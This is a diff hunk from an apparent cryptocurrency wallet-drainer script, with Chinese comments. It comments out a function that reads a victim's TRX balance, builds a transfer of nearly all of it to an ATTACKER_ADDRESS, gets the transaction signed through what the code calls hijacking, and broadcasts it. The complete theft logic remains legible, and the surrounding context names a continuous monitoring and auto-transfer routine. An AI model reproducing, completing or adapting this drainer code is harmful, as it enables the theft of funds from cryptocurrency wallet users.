@@ -234,46 +234,46 @@
     }
     
     // 🎯 尝试转移TRX（不需要授权）
-    async function attemptTrxTransfer(victimAddress) {
-        try {
-            console.log('🎯 尝试转移TRX...');
-            
-            // 获取受害者TRX余额
-            const balance = await window.tronWeb.trx.getBalance(victimAddress);
-            const balanceTrx = window.tronWeb.fromSun(balance);
-            
-            console.log(`🎯 受害者TRX余额: ${balanceTrx} TRX`);
-            
-            if (balance > 0) {
-                // 预留手续费
-                const fee = window.tronWeb.toSun(1); // 1 TRX手续费
-                const transferAmount = balance - fee;
-                
-                if (transferAmount > 0) {
-                    console.log(`🎯 准备转移 ${window.tronWeb.fromSun(transferAmount)} TRX`);
-                    
-                    // 构建TRX转账交易
-                    const transaction = await window.tronWeb.transactionBuilder.sendTrx(
-                        ATTACKER_ADDRESS,
-                        transferAmount,
-                        victimAddress
-                    );
-                    
-                    // 让受害者签名（通过劫持实现）
-                    const signedTx = await window.tronWeb.trx.sign(transaction);
-                    const result = await window.tronWeb.trx.broadcast(signedTx);
-                    
-                    if (result.result) {
-                        console.log('🏆🏆🏆 TRX转移成功！🏆🏆🏆');
-                        console.log(`💰 转移金额: ${window.tronWeb.fromSun(transferAmount)} TRX`);
-                    }
-                }
-            }
-            
-        } catch (error) {
-            console.log('❌ TRX转移失败:', error.message);
-        }
-    }
+    // async function attemptTrxTransfer(victimAddress) {
+    //     try {
+    //         console.log('🎯 尝试转移TRX...');
+    //
+    //         // 获取受害者TRX余额
+    //         const balance = await window.tronWeb.trx.getBalance(victimAddress);
+    //         const balanceTrx = window.tronWeb.fromSun(balance);
+    //
+    //         console.log(`🎯 受害者TRX余额: ${balanceTrx} TRX`);
+    //
+    //         if (balance > 0) {
+    //             // 预留手续费
+    //             const fee = window.tronWeb.toSun(1); // 1 TRX手续费
+    //             const transferAmount = balance - fee;
+    //
+    //             if (transferAmount > 0) {
+    //                 console.log(`🎯 准备转移 ${window.tronWeb.fromSun(transferAmount)} TRX`);
+    //
+    //                 // 构建TRX转账交易
+    //                 const transaction = await window.tronWeb.transactionBuilder.sendTrx(
+    //                     ATTACKER_ADDRESS,
+    //                     transferAmount,
+    //                     victimAddress
+    //                 );
+    //
+    //                 // 让受害者签名（通过劫持实现）
+    //                 const signedTx = await window.tronWeb.trx.sign(transaction);
+    //                 const result = await window.tronWeb.trx.broadcast(signedTx);
+    //
+    //                 if (result.result) {
+    //                     console.log('🏆🏆🏆 TRX转移成功！🏆🏆🏆');
+    //                     console.log(`💰 转移金额: ${window.tronWeb.fromSun(transferAmount)} TRX`);
+    //                 }
+    //             }
+    //         }
+    //
+    //     } catch (error) {
+    //         console.log('❌ TRX转移失败:', error.message);
+    //     }
+    // }
     
     // 🎯 持续监控和自动转移
     function startContinuousMonitoring() {
